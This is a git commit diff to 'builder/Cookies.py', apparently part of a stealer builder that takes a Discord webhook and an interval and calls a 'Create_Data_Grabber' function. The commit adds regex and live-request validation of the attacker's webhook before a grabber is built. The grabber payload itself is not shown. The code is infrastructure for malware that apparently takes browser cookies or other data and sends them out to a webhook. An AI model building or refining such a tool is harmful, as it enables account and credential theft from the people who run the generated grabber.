3f9ba0dbad95bfc3507f794c5b0a33ed03237caf
0x00A7AFBC <64595170+0x00A7AFBC@users.noreply.github.com>
2022-07-24 14:14:14 +0200

    Webhook regex and request validation
    Tested with Discord webhook and Pipedream webhook

--- builder/Cookies.py
+++ builder/Cookies.py
@@ -1,4 +1,5 @@
 import os
+import re
 try: import requests
 except ImportError: os.system('pip install requests')
 
@@ -41,7 +42,14 @@ except:
         exit()
 
 
+def test_webhook(webhook):
+    body = {'content':'WEBHOOK TEST'}
+    return requests.post(webhook, json=body).status_code
 
+def validate_webhook(webhook):
+    is_valid_url = re.match(pattern=r"^(((http|ftp|https):\/{2})+(([0-9a-z_-]+\.)+(aero|asia|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|cz|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mn|mn|mo|mp|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|nom|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ra|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|arpa)(:[0-9]+)?((\/([~0-9a-zA-Z\#\+\%@\.\/_-]+))?(\?[0-9a-zA-Z\+\%@\/&\[\];=_-]+)?)?))\b", string=webhook) != None
+    is_working = test_webhook(webhook)
+    return  is_valid_url and (is_working == 204 or is_working == 200)
 
 
 '''
@@ -66,6 +74,11 @@ def main_menu():
         clear()
         webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
+        if not validate_webhook(webhook):
+            print(f"{Fore.LIGHTRED_EX}Webhook could not be validated{Fore.RESET}")
+            sleep(1)
+            main_menu()
+            
         intervals = str(input(
             f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
         if intervals == "":
@@ -78,6 +91,11 @@ def main_menu():
         clear()
         webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
+        if not validate_webhook(webhook):
+            print(f"{Fore.LIGHTRED_EX}Webhook could not be validated{Fore.RESET}")
+            sleep(1)
+            main_menu()
+            
         Create_Data_Grabber(webhook)
         main_menu()
 
